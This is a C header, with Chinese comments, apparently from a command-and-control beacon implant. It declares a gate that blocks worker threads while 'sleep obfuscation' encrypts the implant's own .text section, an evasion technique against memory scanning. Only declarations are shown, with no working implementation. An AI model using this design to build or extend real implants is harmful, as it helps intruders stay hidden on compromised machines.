#pragma once

#include "beacon_common.h"

struct BeaconContext;

/*
 * 运行时门控：实现 worker 与 sleep obf 的互斥。
 * worker 活跃时禁止 sleep obf（防止加密 .text 时执行代码）。
 */
typedef struct RuntimeGate {
    CRITICAL_SECTION lock;      /* 互斥锁 */
    LONG active_count;          /* 当前活跃 worker 数量 */
    LONG sleep_obf_pending;     /* sleep obf 已请求但未进入 */
    LONG sleep_obf_active;      /* sleep obf 正在运行（.text 已加密） */
    HANDLE wake_event;          /* 唤醒事件（用于提前唤醒 sleep） */
} RuntimeGate;

/* 初始化运行时门控 */
VOID RuntimeGateInit(RuntimeGate* gate);

/* 释放运行时门控 */
VOID RuntimeGateFree(RuntimeGate* gate);

/*
 * 开始一次 worker 活动。
 * 如果 sleep obf 正在运行或 pending，返回 FALSE（拒绝启动）。
 */
BOOL RuntimeActivityBegin(struct BeaconContext* ctx);

/* 结束一次 worker 活动 */
VOID RuntimeActivityEnd(struct BeaconContext* ctx);

/*
 * 请求开始 sleep obfuscation。
 * 如果有活跃 worker，返回 FALSE（回退到 plain sleep）。
 */
BOOL RuntimeSleepObfBegin(struct BeaconContext* ctx);

/* 结束 sleep obfuscation */
VOID RuntimeSleepObfEnd(struct BeaconContext* ctx);
